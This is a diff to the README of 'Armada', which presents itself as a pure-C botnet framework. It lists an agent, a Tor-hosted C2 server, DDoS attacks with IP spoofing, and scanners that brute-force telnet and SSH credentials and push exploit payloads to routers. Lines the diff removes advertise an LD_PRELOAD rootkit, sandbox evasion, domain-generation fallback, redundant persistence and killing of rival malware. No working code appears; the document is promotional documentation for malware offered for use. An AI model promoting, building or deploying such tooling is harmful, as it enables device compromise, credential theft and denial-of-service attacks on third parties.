@@ -1,13 +1,14 @@
 ```
-     ___    ____  __  ______   ___    ____  ___ 
-    /   |  / __ \/  |/  /   | / _ \  /   | /   |
-   / /| | / /_/ / /|_/ / /| |/ / | \/ /| |/ /| |
-  / ___ |/ _, _/ /  / / ___ / /_| / ___ / ___ |
- /_/  |_/_/ |_/_/  /_/_/  |_\____/_/  |_/_/  |_|
-                                                  
-  ============================================
-   FLEET-GRADE C2 INFRASTRUCTURE  |  PURE C
-  ============================================
+                                                _____                            .___       
+                                               /  _  \_______  _____ _____     __| _/____   
+                                              /  /_\  \_  __ \/     \\__  \   / __ |\__  \  
+                                             /    |    \  | \/  Y Y  \/ __ \_/ /_/ | / __ \_
+                                             \____|__  /__|  |__|_|  (____  /\____ |(____  /
+                                                     \/            \/     \/      \/     \/
+                              1. a fleet of warships 2. a large force or group usually of moving things               
+                                               ============================================
+                                                  Not Mirai, Not Even Close  |  PURE C
+                                               ============================================
 ```
 
 <p align="center">
@@ -23,25 +24,15 @@
 ## Overview
 
 Armada is a complete fleet management framework -- agent, C2 server, relay network, web panel, and automated deployment. The agent is written in pure C with zero external dependencies and compiles to a single ~80KB static binary across 14 architectures, from MIPS routers to x86 servers.
-
-Everything on the wire is encrypted. The transport uses ephemeral X25519 key exchange with forward secrecy -- extracting keys from a captured binary does not decrypt past traffic. Config strings are dual-layer encrypted (AES-256 + ChaCha20-Poly1305) with two independent keys. The C2 runs as a Tor hidden service with optional clearnet relay.
-
 ---
 
-## Why Armada
+## Setup
 
-| Problem | Armada's Answer |
-|---------|----------------|
-| Most agents need OpenSSL or external crypto | All crypto in pure C. Zero dependencies. Compiles anywhere GCC runs. |
-| Single-arch binaries limit device reach | 14 architectures from one build script. MIPS, ARM, x86, PowerPC, SH4, ARC, SPARC, m68k. |
-| Traffic captured = game over | X25519 ephemeral DH per session. Forward secrecy. Recorded traffic is useless. |
-| Config strings in cleartext | Dual-layer: AES-256-CTR outer + ChaCha20-Poly1305 AEAD inner. Two cipher families, two key pairs. |
-| C2 IP exposed in binary | Multi-layer address obfuscation + DGA fallback. 20 fresh domains per day when hardcoded addresses fail. |
-| Persistence removed by one cleanup | Three independent mechanisms (systemd + rc.local + cron). Survives any single removal. |
-| Agent visible in ps/top/netstat | LD_PRELOAD rootkit hooks 8 syscalls. Process name spoofed to kernel thread names. |
-| Sandbox catches it in 5 seconds | Nanosecond timing gates + /proc scanning. Detects VMs, emulators, and tracing tools before executing any payload. |
-| Competing malware steals resources | Killer module: process scanning + port reclamation. Binds stolen ports to block reclamation. |
-| Need proxies from the fleet | Full RFC 1928/1929 SOCKS5 with backconnect relay. Bot IP never exposed. |
+```bash
+python3 setup.py
+```
+
+One wizard. Generates all crypto keys, obfuscates C2 through multiple encryption layers, configures credentials, cross-compiles 14 architectures, packs binaries. Deployed from zero in under 5 minutes.
 
 ---
 
@@ -49,7 +40,7 @@ Everything on the wire is encrypted. The transport uses ephemeral X25519 key exc
 
 ### Encryption & Transport
 
-- **VPE2 protocol** -- X25519 ephemeral DH, HMAC-SHA256 key derivation, ChaCha20 stream cipher with per-direction keys
+- **Custom protocol** -- X25519 ephemeral DH, HMAC-SHA256 key derivation, ChaCha20 stream cipher with per-direction keys
 - **Dual-layer config encryption** -- AES-256-CTR outer + ChaCha20-Poly1305 AEAD inner, two independent key pairs
 - **C2 address obfuscation** -- HMAC-SHA256 integrity + ChaCha20 + XOR rotation + Base64, nested inside dual-layer blob
 - **~600 lines of pure C crypto** -- ChaCha20, Poly1305, AES-256, SHA-256, HMAC-SHA256, X25519
@@ -84,17 +75,14 @@ Everything on the wire is encrypted. The transport uses ephemeral X25519 key exc
 
 Full IP spoofing, TTL/TOS/DF manipulation, CIDR targeting, per-flag control. 15 concurrent attacks per node. Fork-isolated with duration timers.
 
-### Scanners (7 modules)
+### Scanners (3 modules)
 
 | Scanner | Target | Method |
 |---------|--------|--------|
 | Telnet | Port 23 | 128 concurrent connections, weighted dictionary |
 | SSH | Port 22 | Configurable combo lists |
 | HTTP | Custom | Exploit payloads, response pattern matching |
-| Redis | 6379 | Unauth/weak-auth exploitation |
-| PostgreSQL | 5432 | Credential brute-force |
-| MySQL | 3306 | Credential brute-force |
-| Zyxel | Router | Device-specific exploit chain |
+
 
 All scanners feed into a **work-stealing job system** -- C2 distributes target lists across the fleet, tracks real-time progress, collects credentials, exports CSV.
 
@@ -383,12 +371,7 @@ armada/
 +-- setup.py                Interactive setup wizard
 ```
 
+Cause boats needs captains   
+
 ---
 
-## Setup
-
-```bash
-python3 setup.py
-```
-
-One wizard. Generates all crypto keys, obfuscates C2 through multiple encryption layers, configures credentials, cross-compiles 14 architectures, packs binaries. Deployed from zero in under 5 minutes.
